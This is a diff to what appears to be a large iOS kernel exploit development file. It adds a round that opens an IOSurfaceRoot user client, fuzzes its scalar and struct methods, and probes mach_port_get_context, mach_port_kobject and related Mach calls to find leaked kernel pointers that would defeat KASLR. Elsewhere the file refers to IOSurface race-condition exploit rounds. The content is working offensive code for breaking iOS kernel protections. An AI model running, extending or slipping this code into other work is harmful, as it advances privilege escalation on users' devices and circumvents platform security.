@@ -25998,6 +25998,257 @@ static void r494_exploit(void) {
     fflush(stdout);
 }
 
+/* ============================================================
+ * r495: IOSurfaceRoot user client with real input +
+ *       mach port context/kobject leak attempts
+ *
+ * We have a valid IOSurfaceRootUserClient connection.
+ * Now try selectors with actual surface IDs as scalar input.
+ * Also try mach_port_get_context which on some iOS versions
+ * returns kernel addresses of associated objects.
+ * ============================================================ */
+
+static void r495_exploit(void) {
+    rlog("\n=== r495: IOSurfaceRoot methods + mach port leak ===\n\n");
+    fflush(stdout);
+
+    /* Create a test IOSurface to get a known surface ID */
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpr = 256, bpe = 4, pf = 0x42475241;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
+    CFNumberRef nbpe = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    CFNumberRef npf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+    CFDictionarySetValue(sprops, kIOSurfaceWidth, nw);
+    CFDictionarySetValue(sprops, kIOSurfaceHeight, nh);
+    CFDictionarySetValue(sprops, kIOSurfaceBytesPerRow, nbpr);
+    CFDictionarySetValue(sprops, kIOSurfaceBytesPerElement, nbpe);
+    CFDictionarySetValue(sprops, kIOSurfacePixelFormat, npf);
+    int allocsz = 64 * 256;
+    CFNumberRef nas = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &allocsz);
+    CFDictionarySetValue(sprops, kIOSurfaceAllocSize, nas);
+    CFRelease(nw); CFRelease(nh); CFRelease(nbpr);
+    CFRelease(nbpe); CFRelease(npf); CFRelease(nas);
+
+    IOSurfaceRef surf = IOSurfaceCreate(sprops);
+    CFRelease(sprops);
+    if (!surf) { rlog("  Failed to create surface\n"); goto r495_done; }
+
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Test surface ID=%u addr=%p\n", sid, surf);
+
+    /* Open IOSurfaceRoot user client */
+    CFMutableDictionaryRef match = IOServiceMatching("IOSurfaceRoot");
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, match);
+    if (!svc) { rlog("  No IOSurfaceRoot\n"); CFRelease(surf); goto r495_done; }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    rlog("  UserClient: kr=%d conn=0x%x\n", kr, conn);
+    if (kr != KERN_SUCCESS || !conn) { CFRelease(surf); goto r495_done; }
+
+    /* Part 1: Scalar methods with surface ID as input */
+    rlog("\n--- Part 1: Scalar methods with surfID=%u ---\n", sid);
+    for (uint32_t sel = 0; sel < 40; sel++) {
+        uint64_t in[4] = {sid, 0, 0, 0};
+        uint64_t out[16] = {0};
+        uint32_t ocnt = 16;
+        /* Try with 1 scalar input (the surface ID) */
+        kr = IOConnectCallScalarMethod(conn, sel, in, 1, out, &ocnt);
+        if (kr == KERN_SUCCESS || (kr != 0xe00002c2 && kr != 0xe00002bc)) {
+            rlog("  sel=%u(1in): kr=0x%x ocnt=%u", sel, kr, ocnt);
+            for (uint32_t j = 0; j < ocnt && j < 8; j++) {
+                rlog(" [%u]=0x%llx", j, (unsigned long long)out[j]);
+                if ((out[j] >> 36) == 0xfffffff || (out[j] >> 36) == 0xfffffffe)
+                    rlog("***KPTR***");
+            }
+            rlog("\n");
+        }
+        /* Try with 2 scalar inputs */
+        ocnt = 16;
+        memset(out, 0, sizeof(out));
+        kr = IOConnectCallScalarMethod(conn, sel, in, 2, out, &ocnt);
+        if (kr == KERN_SUCCESS || (kr != 0xe00002c2 && kr != 0xe00002bc &&
+            kr != 0xe00002ed /* not same as 1-input result */)) {
+            rlog("  sel=%u(2in): kr=0x%x ocnt=%u", sel, kr, ocnt);
+            for (uint32_t j = 0; j < ocnt && j < 8; j++) {
+                rlog(" [%u]=0x%llx", j, (unsigned long long)out[j]);
+                if ((out[j] >> 36) == 0xfffffff || (out[j] >> 36) == 0xfffffffe)
+                    rlog("***KPTR***");
+            }
+            rlog("\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Part 2: Struct methods with surface ID in input buffer */
+    rlog("\n--- Part 2: Struct methods with surfID ---\n");
+    for (uint32_t sel = 0; sel < 40; sel++) {
+        uint32_t inbuf[16] = {0};
+        inbuf[0] = sid;
+        uint8_t outbuf[512] = {0};
+        size_t outlen = 512;
+        kr = IOConnectCallStructMethod(conn, sel, inbuf, 4, outbuf, &outlen);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc && outlen > 0) {
+            rlog("  struct sel=%u(4B): kr=0x%x outlen=%zu\n", sel, kr, outlen);
+            /* Print first 64 bytes as hex */
+            rlog("    data:");
+            for (size_t j = 0; j < outlen && j < 64; j++) rlog(" %02x", outbuf[j]);
+            if (outlen > 64) rlog(" ...");
+            rlog("\n");
+            /* Scan for kptrs */
+            for (size_t j = 0; j + 7 < outlen; j += 8) {
+                uint64_t v;
+                memcpy(&v, outbuf + j, 8);
+                if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                    rlog("    *** KPTR at off %zu: 0x%llx ***\n",
+                         j, (unsigned long long)v);
+                }
+            }
+        }
+        /* Also try with 64 bytes of input (surface ID + padding) */
+        inbuf[1] = 0; inbuf[2] = 0; inbuf[3] = 0;
+        outlen = 512;
+        memset(outbuf, 0, sizeof(outbuf));
+        kr = IOConnectCallStructMethod(conn, sel, inbuf, 64, outbuf, &outlen);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc && outlen > 0) {
+            rlog("  struct sel=%u(64B): kr=0x%x outlen=%zu\n", sel, kr, outlen);
+            rlog("    data:");
+            for (size_t j = 0; j < outlen && j < 64; j++) rlog(" %02x", outbuf[j]);
+            rlog("\n");
+            for (size_t j = 0; j + 7 < outlen; j += 8) {
+                uint64_t v;
+                memcpy(&v, outbuf + j, 8);
+                if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe)
+                    rlog("    *** KPTR at off %zu: 0x%llx ***\n",
+                         j, (unsigned long long)v);
+            }
+        }
+    }
+    fflush(stdout);
+
+    IOServiceClose(conn);
+
+    /* Part 3: mach_port_get_context on IOSurface mach port */
+    rlog("\n--- Part 3: mach_port_get_context ---\n");
+    {
+        mach_port_t task = mach_task_self();
+
+        /* Create some mach ports and check context */
+        mach_port_t ports[10];
+        for (int i = 0; i < 10; i++) {
+            kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr == KERN_SUCCESS) {
+                mach_port_context_t ctx = 0;
+                kr = mach_port_get_context(task, ports[i], &ctx);
+                rlog("  port[%d]=0x%x get_context: kr=%d ctx=0x%llx",
+                     i, ports[i], kr, (unsigned long long)ctx);
+                if (ctx != 0 && ((ctx >> 36) == 0xfffffff || (ctx >> 36) == 0xfffffffe))
+                    rlog(" ***KPTR***");
+                rlog("\n");
+            }
+        }
+
+        /* Try mach_port_get_context on special ports */
+        mach_port_t special_ports[] = {
+            mach_task_self(), mach_host_self(), mach_thread_self()
+        };
+        const char *sp_names[] = {"task_self", "host_self", "thread_self"};
+        for (int i = 0; i < 3; i++) {
+            mach_port_context_t ctx = 0;
+            kr = mach_port_get_context(task, special_ports[i], &ctx);
+            rlog("  %s(0x%x) get_context: kr=%d ctx=0x%llx",
+                 sp_names[i], special_ports[i], kr, (unsigned long long)ctx);
+            if (ctx != 0 && ((ctx >> 36) == 0xfffffff || (ctx >> 36) == 0xfffffffe))
+                rlog(" ***KPTR***");
+            rlog("\n");
+        }
+
+        /* Try mach_port_kobject — may be restricted */
+        rlog("\n  mach_port_kobject probes:\n");
+        for (int i = 0; i < 3; i++) {
+            natural_t ktype = 0;
+            mach_vm_address_t kaddr = 0;
+            kr = mach_port_kobject(task, special_ports[i], &ktype, &kaddr);
+            rlog("    %s: kr=%d type=%u addr=0x%llx",
+                 sp_names[i], kr, ktype, (unsigned long long)kaddr);
+            if (kaddr != 0 && ((kaddr >> 36) == 0xfffffff || (kaddr >> 36) == 0xfffffffe))
+                rlog(" ***KPTR***");
+            rlog("\n");
+        }
+
+        /* Clean up */
+        for (int i = 0; i < 10; i++)
+            mach_port_deallocate(task, ports[i]);
+        mach_port_deallocate(task, special_ports[2]); /* thread_self */
+    }
+    fflush(stdout);
+
+    /* Part 4: Try task_for_pid(0) — probably denied but check */
+    rlog("\n--- Part 4: Miscellaneous kernel queries ---\n");
+    {
+        /* Try processor_set_default for host */
+        processor_set_name_t pset;
+        kr = processor_set_default(mach_host_self(), &pset);
+        rlog("  processor_set_default: kr=%d pset=0x%x\n", kr, pset);
+        if (kr == KERN_SUCCESS) {
+            mach_port_context_t ctx = 0;
+            kr = mach_port_get_context(mach_task_self(), pset, &ctx);
+            rlog("    pset get_context: kr=%d ctx=0x%llx\n", kr,
+                 (unsigned long long)ctx);
+        }
+
+        /* Try host_processor_set_priv — probably denied */
+        processor_set_t pset_priv;
+        kr = host_processor_set_priv(mach_host_self(), pset, &pset_priv);
+        rlog("  host_processor_set_priv: kr=%d\n", kr);
+
+        /* clock_get_time — just checking for sanity */
+        clock_serv_t clock;
+        kr = host_get_clock_service(mach_host_self(), 0, &clock);
+        rlog("  host_get_clock_service: kr=%d clock=0x%x\n", kr, clock);
+        if (kr == KERN_SUCCESS) {
+            mach_port_context_t ctx = 0;
+            kr = mach_port_get_context(mach_task_self(), clock, &ctx);
+            rlog("    clock get_context: kr=%d ctx=0x%llx\n", kr,
+                 (unsigned long long)ctx);
+            mach_port_deallocate(mach_task_self(), clock);
+        }
+
+        /* vm_region_recurse on our own memory — check for leaked metadata */
+        mach_vm_address_t addr = 0x100000000ULL; /* text segment area */
+        mach_vm_size_t size = 0;
+        natural_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t icnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kr = mach_vm_region_recurse(mach_task_self(), &addr, &size, &depth,
+            (vm_region_recurse_info_t)&info, &icnt);
+        rlog("  vm_region_recurse(0x100000000): kr=%d addr=0x%llx "
+             "size=0x%llx depth=%u\n", kr, (unsigned long long)addr,
+             (unsigned long long)size, depth);
+        if (kr == KERN_SUCCESS) {
+            rlog("    protection=%d max_prot=%d inheritance=%d "
+                 "object_id=0x%x offset=0x%llx\n",
+                 info.protection, info.max_protection, info.inheritance,
+                 info.object_id, (unsigned long long)info.offset);
+            uint64_t oid = info.object_id;
+            if ((oid >> 36) == 0xfffffff || (oid >> 36) == 0xfffffffe)
+                rlog("    *** KPTR in object_id! ***\n");
+        }
+    }
+    fflush(stdout);
+
+    CFRelease(surf);
+
+r495_done:
+    rlog("\n=== r495 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -96075,6 +96326,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 499) {
+            rlog("*** rounds=499: IOSurfaceRoot methods + mach port leak ***\n\n");
+            fflush(stdout);
+            r495_exploit();
+            goto done;
+        }
         if (rounds == 498) {
             rlog("*** rounds=498: Systematic kernel pointer leak hunt ***\n\n");
             fflush(stdout);
@@ -99072,7 +99329,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
